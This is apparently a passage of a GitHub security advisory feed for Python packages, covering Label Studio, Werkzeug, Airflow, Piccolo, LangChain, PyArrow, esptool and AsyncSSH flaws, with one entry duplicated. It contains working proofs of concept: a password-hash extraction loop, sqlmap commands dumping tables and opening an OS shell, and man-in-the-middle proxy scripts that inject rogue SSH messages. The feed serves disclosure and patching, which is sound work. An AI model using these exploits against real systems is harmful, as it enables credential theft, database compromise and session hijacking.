def test_char(config_dict, known_hash, c):
    json_payload_suffix = PAYLOAD
    test_escaped = re.escape(known_hash + c)
    json_payload_suffix["data"]["filters"]["items"][0]["value"] =  f"^{test_escaped}"

    suffix_result = test_payload(config_dict, json_payload_suffix)
    if suffix_result:
        return (known_hash + c, c)
    
    return None

def main():
    config_dict = setup()
    # By default Label Studio password hashes start with these characters
    known_hash = "pbkdf2_sha256$260000$"
    print()
    print(f"dumped: {known_hash}", end="")
    sys.stdout.flush()

    while True:
        found = False

        for c in CHARS:
            r = test_char(config_dict, known_hash, c)
            if not r is None:
                new_hash, c = r
                known_hash = new_hash
                print(c, end="")
                sys.stdout.flush()
                found = True
                break

        if not found:
            break

    print()

if __name__ == "__main__":
    main()
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/HumanSignal/label-studio/security/advisories/GHSA-6hjj-gq77-j4qw">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-6hjj-gq77-j4qw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47117">https://nvd.nist.gov/vuln/detail/CVE-2023-47117</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/commit/f931d9d129002f54a495995774ce7384174cef5c">https://github.com/HumanSignal/label-studio/commit/f931d9d129002f54a495995774ce7384174cef5c</a></li>
<li><a href="https://github.com/advisories/GHSA-6hjj-gq77-j4qw">https://github.com/advisories/GHSA-6hjj-gq77-j4qw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6hjj-gq77-j4qw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-14T18:27:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[werkzeug] Werkzeug DoS: High resource usage when parsing multipart/form-data containing a large part with CR/LF character at the beginning]]></title>
        <id>https://github.com/advisories/GHSA-hrfv-mqp8-q5rw</id>
        <link href="https://github.com/advisories/GHSA-hrfv-mqp8-q5rw"/>
        <updated>2023-11-13T21:05:55.000Z</updated>
        <content type="html"><![CDATA[<p>Werkzeug multipart data parser needs to find a boundary that may be between consecutive chunks. That's why parsing is based on looking for newline characters. Unfortunately, code looking for partial boundary in the buffer is written inefficiently, so if we upload a file that starts with CR or LF and then is followed by megabytes of data without these characters: all of these bytes are appended chunk by chunk into internal bytearray and lookup for boundary is performed on growing buffer.</p>
<p>This allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. The amount of RAM required can trigger an out of memory kill of the process. If many concurrent requests are sent continuously, this can exhaust or kill all available workers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pallets/werkzeug/security/advisories/GHSA-hrfv-mqp8-q5rw">https://github.com/pallets/werkzeug/security/advisories/GHSA-hrfv-mqp8-q5rw</a></li>
<li><a href="https://github.com/pallets/werkzeug/commit/b1916c0c083e0be1c9d887ee2f3d696922bfc5c1">https://github.com/pallets/werkzeug/commit/b1916c0c083e0be1c9d887ee2f3d696922bfc5c1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46136">https://nvd.nist.gov/vuln/detail/CVE-2023-46136</a></li>
<li><a href="https://github.com/pallets/werkzeug/commit/f3c803b3ade485a45f12b6d6617595350c0f03e2">https://github.com/pallets/werkzeug/commit/f3c803b3ade485a45f12b6d6617595350c0f03e2</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/werkzeug/PYSEC-2023-221.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/werkzeug/PYSEC-2023-221.yaml</a></li>
<li><a href="https://github.com/pallets/werkzeug/commit/f2300208d5e2a5076cbbb4c2aad71096fd040ef9">https://github.com/pallets/werkzeug/commit/f2300208d5e2a5076cbbb4c2aad71096fd040ef9</a></li>
<li><a href="https://github.com/advisories/GHSA-hrfv-mqp8-q5rw">https://github.com/advisories/GHSA-hrfv-mqp8-q5rw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hrfv-mqp8-q5rw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-25T14:22:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[werkzeug] Werkzeug DoS: High resource usage when parsing multipart/form-data containing a large part with CR/LF character at the beginning]]></title>
        <id>https://github.com/advisories/GHSA-hrfv-mqp8-q5rw</id>
        <link href="https://github.com/advisories/GHSA-hrfv-mqp8-q5rw"/>
        <updated>2023-11-13T21:05:55.000Z</updated>
        <content type="html"><![CDATA[<p>Werkzeug multipart data parser needs to find a boundary that may be between consecutive chunks. That's why parsing is based on looking for newline characters. Unfortunately, code looking for partial boundary in the buffer is written inefficiently, so if we upload a file that starts with CR or LF and then is followed by megabytes of data without these characters: all of these bytes are appended chunk by chunk into internal bytearray and lookup for boundary is performed on growing buffer.</p>
<p>This allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. The amount of RAM required can trigger an out of memory kill of the process. If many concurrent requests are sent continuously, this can exhaust or kill all available workers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pallets/werkzeug/security/advisories/GHSA-hrfv-mqp8-q5rw">https://github.com/pallets/werkzeug/security/advisories/GHSA-hrfv-mqp8-q5rw</a></li>
<li><a href="https://github.com/pallets/werkzeug/commit/b1916c0c083e0be1c9d887ee2f3d696922bfc5c1">https://github.com/pallets/werkzeug/commit/b1916c0c083e0be1c9d887ee2f3d696922bfc5c1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46136">https://nvd.nist.gov/vuln/detail/CVE-2023-46136</a></li>
<li><a href="https://github.com/pallets/werkzeug/commit/f3c803b3ade485a45f12b6d6617595350c0f03e2">https://github.com/pallets/werkzeug/commit/f3c803b3ade485a45f12b6d6617595350c0f03e2</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/werkzeug/PYSEC-2023-221.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/werkzeug/PYSEC-2023-221.yaml</a></li>
<li><a href="https://github.com/pallets/werkzeug/commit/f2300208d5e2a5076cbbb4c2aad71096fd040ef9">https://github.com/pallets/werkzeug/commit/f2300208d5e2a5076cbbb4c2aad71096fd040ef9</a></li>
<li><a href="https://github.com/advisories/GHSA-hrfv-mqp8-q5rw">https://github.com/advisories/GHSA-hrfv-mqp8-q5rw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hrfv-mqp8-q5rw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-25T14:22:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow allows authenticated and DAG-view authorized users to modify some DAG run detail values when submitting notes]]></title>
        <id>https://github.com/advisories/GHSA-hm9r-7f84-25c9</id>
        <link href="https://github.com/advisories/GHSA-hm9r-7f84-25c9"/>
        <updated>2023-11-13T20:43:21.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Airflow, versions before 2.7.3, is affected by a vulnerability that allows authenticated and DAG-view authorized Users to modify some DAG run detail values when submitting notes. This could have them alter details such as configuration parameters, start date, etc.&nbsp; Users should upgrade to version 2.7.3 or later which has removed the vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47037">https://nvd.nist.gov/vuln/detail/CVE-2023-47037</a></li>
<li><a href="https://github.com/apache/airflow/pull/33413">https://github.com/apache/airflow/pull/33413</a></li>
<li><a href="https://lists.apache.org/thread/04y4vrw1t2xl030gswtctc4nt1w90cb0">https://lists.apache.org/thread/04y4vrw1t2xl030gswtctc4nt1w90cb0</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/11/12/1">http://www.openwall.com/lists/oss-security/2023/11/12/1</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2023-232.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2023-232.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-hm9r-7f84-25c9">https://github.com/advisories/GHSA-hm9r-7f84-25c9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hm9r-7f84-25c9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-12T15:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[piccolo] piccolo SQL Injection via named transaction savepoints]]></title>
        <id>https://github.com/advisories/GHSA-xq59-7jf3-rjc6</id>
        <link href="https://github.com/advisories/GHSA-xq59-7jf3-rjc6"/>
        <updated>2023-11-12T15:57:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The handling of named transaction savepoints in all database implementations is vulnerable to <a href="https://owasp.org/www-community/attacks/SQL_Injection">SQL Injection</a> as user provided input is passed directly to <code>connection.execute(...)</code> via f-strings.</p>
<h3 id="details">Details</h3>
<p>An excerpt of the Postgres savepoint handling:</p>
<pre><code class="language-python">    async def savepoint(self, name: t.Optional[str] = None) -&gt; Savepoint:
        name = name or f"savepoint_{self.get_savepoint_id()}"
        await self.connection.execute(f"SAVEPOINT {name}")
        return Savepoint(name=name, transaction=self)
</code></pre>
<p>In this example, we can see user input is directly passed to <code>connection.execute</code> without being properly escaped. </p>
<p>All implementations of savepoints and savepoint methods directly pass this <code>name</code> parameter to <code>connection.execute</code> and are vulnerable to this. A non-exhaustive list can be found below:</p>
<ul>
<li>Postgres</li>
<li><ul>
<li><a href="https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/postgres.py#L239">One</a></li>
</ul>
</li>
<li><ul>
<li><a href="https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/postgres.py#L133">Two</a></li>
</ul>
</li>
<li><ul>
<li><a href="https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/postgres.py#L138">Three</a></li>
</ul>
</li>
<li>Sqlite</li>
<li><ul>
<li><a href="https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/sqlite.py#L416">One</a></li>
</ul>
</li>
<li><ul>
<li><a href="https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/sqlite.py#L313">Two</a></li>
</ul>
</li>
<li><ul>
<li><a href="https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/sqlite.py#L318">Three</a></li>
</ul>
</li>
</ul>
<p>Care should be given to ensuring all strings passed to <code>connection.execute</code> are properly escaped, regardless of how end user facing they may be.</p>
<p>Further to this, the <a href="https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/postgres.py#L404">following method</a> also passes user input directly to an execution context however I have been unable to abuse this functionality at the time of writing. This method also has a far lower chance of being exposed to an end user as it relates to database init functionality.</p>
<h3 id="poc">PoC</h3>
<p>The following FastAPI route can be used in conjunction with <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a> to easily demonstrate the SQL injection.</p>
<pre><code class="language-python">DB = ...

@app.get("/test")
async def test(name):
    async with DB.transaction() as transaction:
        await transaction.savepoint(name)
</code></pre>
<h5 id="steps">Steps</h5>
<ol>
<li>Create a standard Piccolo application with Postgres as a database backend</li>
<li>Add the route shown previously</li>
<li>Run your application, making a note of the URL it is served on</li>
<li>Install <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a></li>
<li>In a terminal, run the following command substituting URL with your applications URL: <code>sqlmap -u "http://URL/test?name=a" --batch</code></li>
<li>Observe sqlmap identifying the vulnerability</li>
</ol>
<p>For sqlmap help, <a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">this usage guide</a> may be useful. The following commands may also be helpful to see the impact.</p>
<h6 id="dumping-all-tables">Dumping all tables</h6>
<p>The <code>--tables</code> flag will enumerate all tables accessible from within the exposed database session.</p>
<p><code>sqlmap -u "http://URL/test?name=a" --batch --tables</code></p>
<p>An example output of this can be seen in the following screenshot.
<img alt="Screenshot from 2023-11-06 23-10-30" src="https://user-images.githubusercontent.com/47520067/280669236-5be9dc0f-4d2c-4bad-a1ba-fc1eb43fdb34.png"></p>
<h6 id="os-shell">OS Shell</h6>
<p>The <code>--os-shell</code> will drop the user into an OS shell on the underlying system if permissions permit. This can be seen in the attached screenshot which prints the databases current working directory. 
<img alt="Screenshot from 2023-11-06 22-43-50" src="https://user-images.githubusercontent.com/47520067/280668670-0a152589-5f4c-468d-99b9-045226934007.png"></p>
<h3 id="impact">Impact</h3>
<p>While the likelihood of an end developer exposing a savepoints <code>name</code> parameter to a user is highly unlikely, it would not be unheard of. If a malicious user was able to abuse this functionality they would have essentially direct access to the database and the ability to modify data to the level of permissions associated with the database user. </p>
<p>A non exhaustive list of actions possible based on database permissions is:</p>
<ul>
<li>Read all data stored in the database, including usernames and password hashes</li>
<li>Insert arbitrary data into the database, including modifying existing records </li>
<li>Gain a shell on the underlying server</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/piccolo-orm/piccolo/security/advisories/GHSA-xq59-7jf3-rjc6">https://github.com/piccolo-orm/piccolo/security/advisories/GHSA-xq59-7jf3-rjc6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47128">https://nvd.nist.gov/vuln/detail/CVE-2023-47128</a></li>
<li><a href="https://github.com/piccolo-orm/piccolo/commit/82679eb8cd1449cf31d87c9914a072e70168b6eb">https://github.com/piccolo-orm/piccolo/commit/82679eb8cd1449cf31d87c9914a072e70168b6eb</a></li>
<li><a href="https://github.com/advisories/GHSA-xq59-7jf3-rjc6">https://github.com/advisories/GHSA-xq59-7jf3-rjc6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xq59-7jf3-rjc6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-11-12T15:57:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langchain] Langchain Server-Side Request Forgery vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-6h8p-4hx9-w66c</id>
        <link href="https://github.com/advisories/GHSA-6h8p-4hx9-w66c"/>
        <updated>2023-11-11T05:04:05.000Z</updated>
        <content type="html"><![CDATA[<p>In Langchain before 0.0.329, prompt injection allows an attacker to force the service to retrieve data from an arbitrary URL, essentially providing SSRF and potentially injecting content into downstream tasks.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-32786">https://nvd.nist.gov/vuln/detail/CVE-2023-32786</a></li>
<li><a href="https://gist.github.com/rharang/d265f46fc3161b31ac2e81db44d662e1">https://gist.github.com/rharang/d265f46fc3161b31ac2e81db44d662e1</a></li>
<li><a href="https://github.com/langchain-ai/langchain/pull/12747">https://github.com/langchain-ai/langchain/pull/12747</a></li>
<li><a href="https://github.com/langchain-ai/langchain/releases/tag/v0.0.329">https://github.com/langchain-ai/langchain/releases/tag/v0.0.329</a></li>
<li><a href="https://github.com/advisories/GHSA-6h8p-4hx9-w66c">https://github.com/advisories/GHSA-6h8p-4hx9-w66c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6h8p-4hx9-w66c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-10-21T00:30:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyarrow] PyArrow: Arbitrary code execution when loading a malicious data file]]></title>
        <id>https://github.com/advisories/GHSA-5wvp-7f3h-6wmm</id>
        <link href="https://github.com/advisories/GHSA-5wvp-7f3h-6wmm"/>
        <updated>2023-11-10T22:16:37.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data in IPC and Parquet readers in PyArrow versions 0.14.0 to 14.0.0 allows arbitrary code execution. An application is vulnerable if it reads Arrow IPC, Feather or Parquet data from untrusted sources (for example user-supplied input files).</p>
<p>This vulnerability only affects PyArrow, not other Apache Arrow implementations or bindings.</p>
<p>It is recommended that users of PyArrow upgrade to 14.0.1. Similarly, it is recommended that downstream libraries upgrade their dependency requirements to PyArrow 14.0.1 or later. PyPI packages are already available, and we hope that conda-forge packages will be available soon.</p>
<p>If it is not possible to upgrade, maintainers provide a separate package <code>pyarrow-hotfix</code> that disables the vulnerability on older PyArrow versions. See <a href="https://pypi.org/project/pyarrow-hotfix/">https://pypi.org/project/pyarrow-hotfix/</a>  for instructions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47248">https://nvd.nist.gov/vuln/detail/CVE-2023-47248</a></li>
<li><a href="https://lists.apache.org/thread/yhy7tdfjf9hrl9vfrtzo8p2cyjq87v7n">https://lists.apache.org/thread/yhy7tdfjf9hrl9vfrtzo8p2cyjq87v7n</a></li>
<li><a href="https://pypi.org/project/pyarrow-hotfix/">https://pypi.org/project/pyarrow-hotfix/</a></li>
<li><a href="https://github.com/apache/arrow/commit/f14170976372436ec1d03a724d8d3f3925484ecf">https://github.com/apache/arrow/commit/f14170976372436ec1d03a724d8d3f3925484ecf</a></li>
<li><a href="https://github.com/advisories/GHSA-5wvp-7f3h-6wmm">https://github.com/advisories/GHSA-5wvp-7f3h-6wmm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5wvp-7f3h-6wmm</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-11-09T09:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[esptool] esptool allows attackers to view sensitive information via weak cryptographic algorithm]]></title>
        <id>https://github.com/advisories/GHSA-3f38-96qm-r3fw</id>
        <link href="https://github.com/advisories/GHSA-3f38-96qm-r3fw"/>
        <updated>2023-11-09T22:10:34.000Z</updated>
        <content type="html"><![CDATA[<p>An issue discovered in esptool 4.6.2 allows attackers to view sensitive information via weak cryptographic algorithm.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46894">https://nvd.nist.gov/vuln/detail/CVE-2023-46894</a></li>
<li><a href="https://github.com/espressif/esptool/issues/926">https://github.com/espressif/esptool/issues/926</a></li>
<li><a href="https://github.com/advisories/GHSA-3f38-96qm-r3fw">https://github.com/advisories/GHSA-3f38-96qm-r3fw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3f38-96qm-r3fw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-09T18:34:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[asyncssh] AsyncSSH Rogue Session Attack]]></title>
        <id>https://github.com/advisories/GHSA-c35q-ffpf-5qpm</id>
        <link href="https://github.com/advisories/GHSA-c35q-ffpf-5qpm"/>
        <updated>2023-11-14T21:16:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An issue in AsyncSSH v2.14.0 and earlier allows attackers to control the remote end of an SSH client session via packet injection/removal and shell emulation.</p>
<h3 id="details">Details</h3>
<p>The rogue session attack targets any SSH client connecting to an AsyncSSH server, on which the attacker must have a shell account. The goal of the attack is to log the client into the attacker's account without the client being able to detect this. At that point, due to how SSH sessions interact with shell environments, the attacker has complete control over the remote end of the SSH session. The attacker receives all keyboard input by the user, completely controls the terminal output of the user's session, can send and receive data to/from forwarded network ports, and is able to create signatures with a forwarded SSH Agent, if any. The result is a complete break of the confidentiality and integrity of the secure channel, providing a strong vector for a targeted phishing campaign against the user. For example, the attacker can display a password prompt and wait for the user to enter the password, elevating the attacker's position to a MitM at the application layer and enabling perfect shell emulation.</p>
<p>The attacks work by the attacker injecting a chosen authentication request before the client's NewKeys. The authentication request sent by the attacker must be a valid authentication request containing his credentials. The attacker can use any authentication mechanism that does not require exchanging additional messages between client and server, such as password or publickey. Due to a state machine flaw, the AsyncSSH server accepts the unauthenticated user authentication request message and defers it until the client has requested the authentication protocol.</p>
<h3 id="poc">PoC</h3>
<details>
  <summary>AsyncSSH 2.14.0 client (simple_client.py example) connecting to AsyncSSH 2.14.0 server (simple_server.py example)</summary>

<pre><code class="language-python">#!/usr/bin/python3
import socket
from threading import Thread
from binascii import unhexlify
from time import sleep

##################################################################################
## Proof of Concept for the rogue session attack (ChaCha20-Poly1305)            ##
##                                                                              ##
## Variant: Unmodified variant (EXT_INFO by client required)                    ##
##                                                                              ##
## Client(s) tested: AsyncSSH 2.14.0 (simple_client.py example)                 ##
## Server(s) tested: AsyncSSH 2.14.0 (simple_server.py example)                 ##
##                                                                              ##
## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0 ##
##################################################################################

# IP and port for the TCP proxy to bind to
PROXY_IP = '127.0.0.1'
PROXY_PORT = 2222

# IP and port of the server
SERVER_IP = '127.0.0.1'
SERVER_PORT = 22

# Length of the individual messages
NEW_KEYS_LENGTH = 16
CLIENT_EXT_INFO_LENGTH = 60
# Additional data sent by the client after NEW_KEYS (excluding EXT_INFO)
ADDITIONAL_CLIENT_DATA_LENGTH = 60

newkeys_payload = b'\x00\x00\x00\x0c\x0a\x15'
def contains_newkeys(data):
    return newkeys_payload in data

rogue_userauth_request = unhexlify('000000440b320000000861747461636b65720000000e7373682d636f6e6e656374696f6e0000000870617373776f7264000000000861747461636b65720000000000000000000000')
def insert_rogue_authentication_request(data):
    newkeys_index = data.index(newkeys_payload)
    # Insert rogue authentication request and remove SSH_MSG_EXT_INFO
    return data[:newkeys_index] + rogue_userauth_request + data[newkeys_index:newkeys_index + NEW_KEYS_LENGTH] + data[newkeys_index + NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH:]

def forward_client_to_server(client_socket, server_socket):
    delay_next = False
    try:
        while True:
            client_data = client_socket.recv(4096)
            if delay_next:
                delay_next = False
                sleep(0.25)
            if contains_newkeys(client_data):
                print("[+] SSH_MSG_NEWKEYS sent by client identified!")
                if len(client_data) &lt; NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH + ADDITIONAL_CLIENT_DATA_LENGTH:
                    print("[+] client_data does not contain all messages sent by the client yet. Receiving additional bytes until we have 156 bytes buffered!")
                while len(client_data) &lt; NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH + ADDITIONAL_CLIENT_DATA_LENGTH:
                    client_data += client_socket.recv(4096)
                print(f"[d] Original client_data before modification: {client_data.hex()}")
                client_data = insert_rogue_authentication_request(client_data)
                print(f"[d] Modified client_data with rogue authentication request: {client_data.hex()}")
                delay_next = True
            if len(client_data) == 0:
                break
            server_socket.send(client_data)
    except ConnectionResetError:
        print("[!] Client connection has been reset. Continue closing sockets.")
    print("[!] forward_client_to_server thread ran out of data, closing sockets!")
    client_socket.close()
    server_socket.close()

def forward_server_to_client(client_socket, server_socket):
    try:
        while True:
            server_data = server_socket.recv(4096)
            if len(server_data) == 0:
                break
            client_socket.send(server_data)
    except ConnectionResetError:
        print("[!] Target connection has been reset. Continue closing sockets.")
    print("[!] forward_server_to_client thread ran out of data, closing sockets!")
    client_socket.close()
    server_socket.close()

if __name__ == '__main__':
    print("--- Proof of Concept for the rogue session attack (ChaCha20-Poly1305) ---")
    mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mitm_socket.bind((PROXY_IP, PROXY_PORT))
    mitm_socket.listen(5)

    print(f"[+] MitM Proxy started. Listening on {(PROXY_IP, PROXY_PORT)} for incoming connections...")

    try:
        while True:
            client_socket, client_addr = mitm_socket.accept()
            print(f"[+] Accepted connection from: {client_addr}")
            print(f"[+] Establishing new server connection to {(SERVER_IP, SERVER_PORT)}.")
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((SERVER_IP, SERVER_PORT))
            print("[+] Spawning new forwarding threads to handle client connection.")
            Thread(target=forward_client_to_server, args=(client_socket, server_socket)).start()
            Thread(target=forward_server_to_client, args=(client_socket, server_socket)).start()
    except KeyboardInterrupt:
        client_socket.close()
        server_socket.close()
        mitm_socket.close()
</code></pre>
</details>

<h3 id="impact">Impact</h3>
<p>The impact heavily depends on the application logic implemented by the AsyncSSH server. In the worst case, the AsyncSSH server starts a shell for the authenticated user upon connection, switching the user to the authenticated one. In this case, the attacker can prepare a modified shell beforehand to perform perfect phishing attacks and become a MitM at the application layer. When the username of the authenticated user is not used beyond authentication, this vulnerability does not impact the connection's security.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ronf/asyncssh/security/advisories/GHSA-c35q-ffpf-5qpm">https://github.com/ronf/asyncssh/security/advisories/GHSA-c35q-ffpf-5qpm</a></li>
<li><a href="https://github.com/ronf/asyncssh/commit/83e43f5ea3470a8617fc388c72b062c7136efd7e">https://github.com/ronf/asyncssh/commit/83e43f5ea3470a8617fc388c72b062c7136efd7e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46446">https://nvd.nist.gov/vuln/detail/CVE-2023-46446</a></li>
<li><a href="https://github.com/advisories/GHSA-c35q-ffpf-5qpm">https://github.com/advisories/GHSA-c35q-ffpf-5qpm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c35q-ffpf-5qpm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-09T18:35:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[asyncssh] AsyncSSH Rogue Extension Negotiation]]></title>
        <id>https://github.com/advisories/GHSA-cfc2-wr2v-gxm5</id>
        <link href="https://github.com/advisories/GHSA-cfc2-wr2v-gxm5"/>
        <updated>2023-11-14T21:16:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An issue in AsyncSSH v2.14.0 and earlier allows attackers to control the extension info message (RFC 8308) via a man-in-the-middle attack.</p>
<h3 id="details">Details</h3>
<p>The rogue extension negotiation attack targets an AsyncSSH client connecting to any SSH server sending an extension info message. The attack exploits an implementation flaw in the AsyncSSH implementation to inject an extension info message chosen by the attacker and delete the original extension info message, effectively replacing it.</p>
<p>A correct SSH implementation should not process an unauthenticated extension info message. However, the injected message is accepted due to flaws in AsyncSSH. AsyncSSH supports the server-sig-algs and global-requests-ok extensions. Hence, the attacker can downgrade the algorithm used for client authentication by meddling with the value of server-sig-algs (e.g. use of SHA-1 instead of SHA-2).</p>
<h3 id="poc">PoC</h3>
<details>
    <summary>AsyncSSH Client 2.14.0 (simple_client.py example) connecting to AsyncSSH Server 2.14.0 (simple_server.py example)</summary>

<pre><code class="language-python"> #!/usr/bin/python3
 import socket
 from threading import Thread
 from binascii import unhexlify
 
 #####################################################################################
 ## Proof of Concept for the rogue extension negotiation attack (ChaCha20-Poly1305) ##
 ##                                                                                 ##
 ## Client(s) tested: AsyncSSH 2.14.0 (simple_client.py example)                    ##
 ## Server(s) tested: AsyncSSH 2.14.0 (simple_server.py example)                    ##
 ##                                                                                 ##
 ## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
 #####################################################################################
 
 # IP and port for the TCP proxy to bind to
 PROXY_IP = '127.0.0.1'
 PROXY_PORT = 2222
 
 # IP and port of the server
 SERVER_IP = '127.0.0.1'
 SERVER_PORT = 22
 
 # Length of the individual messages
 NEW_KEYS_LENGTH = 16
 SERVER_EXT_INFO_LENGTH = 676
 
 newkeys_payload = b'\x00\x00\x00\x0c\x0a\x15'
 def contains_newkeys(data):
     return newkeys_payload in data
 
 # Empty EXT_INFO here to keep things simple, but may also contain actual extensions like server-sig-algs
 rogue_ext_info = unhexlify('0000000C060700000000000000000000')
 def insert_rogue_ext_info(data):
     newkeys_index = data.index(newkeys_payload)
     # Insert rogue extension info and remove SSH_MSG_EXT_INFO
     return data[:newkeys_index] + rogue_ext_info + data[newkeys_index:newkeys_index + NEW_KEYS_LENGTH] + data[newkeys_index + NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:]
 
 def forward_client_to_server(client_socket, server_socket):
     try:
         while True:
             client_data = client_socket.recv(4096)
             if len(client_data) == 0:
                 break
             server_socket.send(client_data)
     except ConnectionResetError:
         print("[!] Client connection has been reset. Continue closing sockets.")
     print("[!] forward_client_to_server thread ran out of data, closing sockets!")
     client_socket.close()
     server_socket.close()
 
 def forward_server_to_client(client_socket, server_socket):
     try:
         while True:
             server_data = server_socket.recv(4096)
             if contains_newkeys(server_data):
                 print("[+] SSH_MSG_NEWKEYS sent by server identified!")
                 if len(server_data) &lt; NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:
                     print("[+] server_data does not contain all messages sent by the server yet. Receiving additional bytes until we have 692 bytes buffered!")
                 while len(server_data) &lt; NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:
                     server_data += server_socket.recv(4096)
                 print(f"[d] Original server_data before modification: {server_data.hex()}")
                 server_data = insert_rogue_ext_info(server_data)
                 print(f"[d] Modified server_data with rogue extension info: {server_data.hex()}")
             if len(server_data) == 0:
                 break
             client_socket.send(server_data)
     except ConnectionResetError:
         print("[!] Target connection has been reset. Continue closing sockets.")
     print("[!] forward_server_to_client thread ran out of data, closing sockets!")
     client_socket.close()
     server_socket.close()
 
 if __name__ == '__main__':
     print("--- Proof of Concept for the rogue extension negotiation attack (ChaCha20-Poly1305) ---")
     mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
